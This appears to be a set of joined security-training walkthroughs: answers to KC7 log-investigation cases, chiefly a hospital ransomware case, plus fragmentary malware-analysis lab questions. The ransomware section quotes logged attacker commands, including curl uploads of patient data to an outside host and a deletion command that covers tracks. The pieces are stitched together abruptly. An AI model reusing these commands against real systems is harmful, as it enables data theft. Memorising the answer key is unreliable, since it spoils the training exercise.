Employees  | count  250     Q2: What is the Chief Financial Officer’s name?  Employees | where role == \"Chief Financial Officer\"  Penny Pincher     Q3: How many distinct senders were seen in the email logs from pharmabest.net?  Email | where sender has \"&lt;Domain Name&gt;\" | distinct &lt;field&gt; | count   236     Q4: How many distinct websites did “Penny Pincher” visit?  Let’s dump the information from Employees here for reference: \"hire_date\": 2022-01-10T00:00:00.000Z,  \"name\": Penny Pincher,  \"user_agent\": Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.96 Safari/537.36,  \"ip_addr\": 10.10.0.1,  \"email_addr\": penny_pincher@azurecresthospital.med,  \"company_domain\": azurecresthospital.med,  \"username\": pepincher,  \"role\": Chief Financial Officer,  \"hostname\": TEX4-MACHINE   Fill out the query with the information provided above and the correct operators to get the data we want: OutboundNetworkEvents | where src_ip == \"10.10.0.1\" | distinct url | count   68     Q5: How many distinct domains in the PassiveDns records contain the word “health”?  PassiveDns | where domain contains \"health\" | distinct domain | count   28     Q6: What IPs did the domain “bit.ly” resolve to (enter any one of them)?

    "content": "This is a walkthrough of the KC7 Case “JoJoHospital”. All questions below are presented in the order of the case unless otherwise specified. All active links have been defanged with brackets to prevent accidental clicks.      Section 1 - “Crypto - but the bad kind”  Questions 1-10  Q1: How many hours did the hackers give the hospital to pay the ransom?    72 hours       Q2: What was the name of the ransomware group?   The ransomware group left a bold name at the top of the note  Lock Byte       Q3: The ransomware group had a snarky and mean slogan: “we spend your money, so ____“  you dont have to.       Q4: How much did the hackers ask the patients to pay?  Not only did the hackers ask the hospital for money, but they also sent scary emails to patients. They asked patients to pay money too, or their personal information would be shared.      Patient LockByte Note     $10,000       Q5: What very important unique identifier number did the ransomware operators threaten to release?  Social Security Number       Q6: How many total files were encrypted at the hospital?  We can confirm that the hackers encrypted files on the machines of many employees. This means those employees could no longer access their important files. This is very bad!  We can find the locked files by looking for files that end with “.encrypted”  FileCreationEvents | where filename endswith \".encrypted\" | count   6420       Q7: How many unique hostnames had files encrypted on them?  To properly scope our investigation, it would be helpful to know how many computers had their files locked up by the ransomware. This information will help us understand the extent of the problem and plan our next steps.  FileCreationEvents | where filename endswith \".encrypted\" | distinct hostname | count   321       Q8: The hackers left a note on at least one of the computers telling the hospital how to pay the ransom. This note had a specific name We_Have_Your_Data_Pay_Up.txt  FileCreationEvents | where filename == \"We_Have_Your_Data_Pay_Up.txt\"                  timestamp       hostname       username       sha256       path       filename       process_name                               2024-06-17T14:49:02.000Z       AMFB-MACHINE       andavis       97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018       C:\\Users\\andavis\\Documents\\We_Have_Your_Data_Pay_Up.txt       We_Have_Your_Data_Pay_Up.txt       explorer.exe                   What was the Sha256 hash of this ransom file?  97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018       Q9: What was the full path of this ransom file?  C:\\Users\\andavis\\Documents\\We_Have_Your_Data_Pay_Up.txt       Q10: On how many hosts (machines) was this ransom file seen?  1       Questions 11-20  Q11: What hostname was the ransom note seen on?  (Hint: refer back to Q8)  This ransom note is a major clue! We can use it to figure out how the ransom might have happened.  AMFB-MACHINE       Q12: Great, now that we know what hostname the file was seen on. We can figure out who it belongs to!  What is the name of the employee whose host has the ransom note?  Employees | where hostname == \"AMFB-MACHINE\"                  hire_date       name       user_agent       ip_addr       email_addr       company_domain       username       role       hostname                               2022-06-15T00:00:00.000Z       Anthony Davis       Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0)       10.10.0.1       anthony_davis@jojoshospital.org       jojoshospital.org       andavis       Senior IT Administrator       AMFB-MACHINE                   Anthony Davis       Q13: Run the query below. How many process events were executed on Anthony’s machine during this time period?  Since the ransom note was only seen on Anthony’s machine, it is likely that more bad stuff happened on this machine.**  We can start by zooming into Anthony’s machine to see what weird things occured in ProcessEvents around the time the company got ransomed.  ProcessEvents tell us what kinds of things happened on a computer.  ProcessEvents | where hostname == \"AMFB-MACHINE\" | where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))   14       Q14: What was the name of the ransomer file mentioned?  Let’s read through the commands in the process_commandline column from the top down. Make sure you are sorting by time.  One of the command mentions a “ransomer”. That’s VERY suspicious!  ProcessEvents | where hostname == \"AMFB-MACHINE\" | where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18)) | where parent_process_name contains \"cmd.exe\"                  timestamp       parent_process_name       parent_process_hash       process_commandline       process_name       process_hash       hostname       username                               2024-06-17T13:35:12.000Z       cmd.exe       614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f       cmd.exe /c copy C:\\Users\\andavis\\Downloads\\lockbyte_ransomer.exe \\jojos-hospital.org\\shared\\spread_ransomware.exe       cmd.exe       b29f5d70d4bf72d146b932550b23541b0797f597e24331d47052dad5212925ba       AMFB-MACHINE       andavis                         2024-06-17T14:23:25.000Z       cmd.exe       614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f       C:\\Users\\andavis\\Downloads\\patient_data_exporter.exe /export C:\\Users\\andavis\\Documents\\patient_data_1.zip /source \\jojos-hospital-server\\important_data\\patient_records       patient_data_exporter.exe       0d663ea9485770015ce187c5796b5e171bcf4b14d48175e7189a3456ccd8cb16       AMFB-MACHINE       andavis                         2024-06-17T14:56:02.000Z       cmd.exe       614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f       C:\\Users\\andavis\\Downloads\\patient_data_exporter.exe /export C:\\Users\\andavis\\Documents\\patient_data_2.zip /source \\jojos-hospital-server\\important_data\\archive\\patient-records       patient_data_exporter.exe       07850b0ffdf2a408bfec18693b339691227e66de3fc320c01725d72b7c4853d2       AMFB-MACHINE       andavis                         2024-06-17T15:54:53.000Z       cmd.exe       614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f       C:\\Users\\andavis\\Downloads\\patient_data_exporter.exe /export C:\\Users\\andavis\\Documents\\patient_data_3.zip /source \\jojos-hospital-server\\important_data\\old-patient-data       patient_data_exporter.exe       071668e559d63b7ea3a71c115f66d612faada08bdca301ba95d0ab2c3045c604       AMFB-MACHINE       andavis                         2024-06-17T17:18:57.000Z       cmd.exe       614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f       cmd.exe /c curl -T C:\\Users\\andavis\\Documents\\patient_data_1.zip https:[//]secure-health-access.com/upload/patient_data_1.zip       cmd.exe       21f6b0962ea22e6eb0c1bb6143090e6929b801b54c584268148518c1864ec3c6       AMFB-MACHINE       andavis                         2024-06-17T17:30:31.000Z       cmd.exe       614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f       cmd.exe /c curl -T C:\\Users\\andavis\\Documents\\patient_data_2.zip https:[//]secure-health-access.com/upload/patient_data_2.zip       cmd.exe       1bef9249ff7ae6480d8d62daaab870e3d1e35a67d7551571551d6214d727fea7       AMFB-MACHINE       andavis                         2024-06-17T17:31:50.000Z       cmd.exe       614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f       cmd.exe /c curl -T C:\\Users\\andavis\\Documents\\patient_data_3.zip https:[//]secure-health-access.com/upload/patient_data_3.zip       cmd.exe       6d88a47faaa3f587650f4ebebe9425b3aff292d74f29f582647f05c3dd4fd78b       AMFB-MACHINE       andavis                         2024-06-17T17:36:47.000Z       cmd.exe       614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f       cmd.exe /c del C:\\Users\\andavis\\Documents\\patient_data_*.zip       cmd.exe       3400577569147cdb0ae8edbc9c77dd921a46ca43e7f386adee895a432baa2644       AMFB-MACHINE       andavis                   lockbyte_ransomer.exe       Q15: When the attackers copied the ”ransomer” file to the network share, what new name did they give it?  The hackers put this “ransomer” file on a shared folder at the hospital called \\\\jojos-hospital.org. They did this to spread the ransomware quickly to many computers in the hospital. By putting the bad file on a shared drive, any computer that could access this drive might run the ransomware.  This way, the infection spreads faster and makes it harder for the hospital’s IT team to stop the attack. The hackers used the hospital’s sharing system to make the attack as big as possible.  spread_ransomware.exe       Q16: What tool did the attackers use to steal the data? This will be a .exe file  If we keep looking down in the data, we can see that the hackers actually stole some data from the hospital as well  patient_data_exporter.exe       Q17: What information did the attackers put into patient_data_1.zip? Provide the full path of the network share \\\\something\\like\\this  \\\\jojos-hospital-server\\important_data\\patient_records       Q18: What information did the attackers put into patient_data_2.zip? Provide the full path of the network share \\\\something\\like\\this  \\\\jojos-hospital-server\\important_data\\archive\\patient-records       Q19: What information did the attackers put into patient_data_3.zip? Provide the full path of the network share \\\\something\\like\\this  \\\\jojos-hospital-server\\important_data\\old-patient-data       Q20: What domain (e.g. abcd.com) did the attackers send the stolen data to?  secure-health-access.com       Questions 21-33  Q21: What command did they use to clear their tracks? Copy and paste the full command.  cmd.exe /c del C:\\Users\\andavis\\Documents\\patient_data_*.zip       Q22: What domain was the patient data exporter file downloaded from?  But wait a minute… patient_data_exporter.exe is not a file that is supposed to be used at the hospital. Where did it come from?  Perhaps it was downloaded.  OutboundNetworkEvents  | where url has \"patient_data_exporter.exe\"   secure-health-access.com       Q23: When was the patient data exporter file downloaded? (copy and paste the exact timestamp)  2024-06-17T14:22:29Z       Q24: How many distinct IPs does the domain secure-health-access.com resolve to?  Okay, so we already know about one domain owned by the hacker. We can use this domain to find more websites or servers that the hacker controls.  PassiveDns | where domain == \"secure-health-access.com\" | distinct ip                  ip                       203.0.113.1                 203.0.113.2                Q25: Which one of these IPs ends with the digit 1?                 ip                       203.0.113.1                Q26: Which one of these IPs ends with the digit 2?                 ip                       203.0.113.2                Q27: What additional domain name is associated with these IP addresses?  Now’s let’s “pivot” on the new IP addresses that we found to see if any other domains are associated with them.  PassiveDns  | where ip in (\"203.0.113.1\", \"203.0.113.2\")                  domain                       secure-health-access.com                 emr-help.net           emr-help.net       Q28: How many requests did the hackers make to our website from these IPs?  Let’s take the actor IPs we found and look for any reconnaissance they conducted against the hospital website. InboundNetworkEvents contains information about browsing to our website.  InboundNetworkEvents | where src_ip  in (\"203.0.113.1\", \"203.0.113.2\")                  Count                       37                Q29: The hackers were curious about how to bypass ___ at Jojo’s hospital.  Wow looks like the threat actors really took their time to research the things they wanted to steal!

Upload the files to https://www.virustotal.com and view the reports. Does this file match any existing antivirus signatures?  Pulling the hash of one file can be done with the following command in PowerShell  Get-FileHash -Path \"C:\\path\\to\\the\\file.ext\" -Algorithm [AlgorithmName]   If you want to pull multiple files in one go, try this command:  Get-ChildItem -Path \"C:\\FolderName\" -Recurse -File | Get-FileHash -Algorithm [AlgorithmName] | Select-Object Hash, Path | Format-Table -AutoSize    The FlareVM setup I am running is completely isolated from the internet so I pulled the hashes from PEviewer.

When were these files compiled?   pestudio view of compile timestamp for .exe file   pestudio view of compile timestamp for .dll file  3. Are there any indications that either of these files are packed or obfuscated? If so, what are the indicators?  4. Do any imports hint at what this malware does? If so, which imports are they?  5. Are there any host based indicators that you could look for on infected systems?  6. What network-based indicators could be used to find this malware on infected machines?  The strings for the .dll file show an IP address:   pestudio view of network-based indicator from .dll file  7. What would you guess is the purpose of these files?  Here is what we know the .exe does from strings and imports:  UnmapViewOfFile - Unmaps a mapped view of a file from the calling process’ address space. Unmapping a mapped view of a file invalidates the range occupied by the view in the address space and makes the range available for other allocations.  MapViewOfFile - Maps a view of a file mapping into the address space of the calling process. Mapping a file makes the specified portion of the file visible in the address space of the calling process.  FindNextFileA - Continues a file search from a previous call to the FindFirstFile  FindFirstFileA - Searches a directory for a file or subdirectory with a name that matches a specific name (or partial name if wildcards are used.)  CopyFileA  CloseHandle  IsBadReadPtr  CreateFileMappingA -  CreateFileA -  FindClose - Closes the search handle created by FindFirstFileA/utilized by FindNextFileA.  Here is what we know the .dll does:"
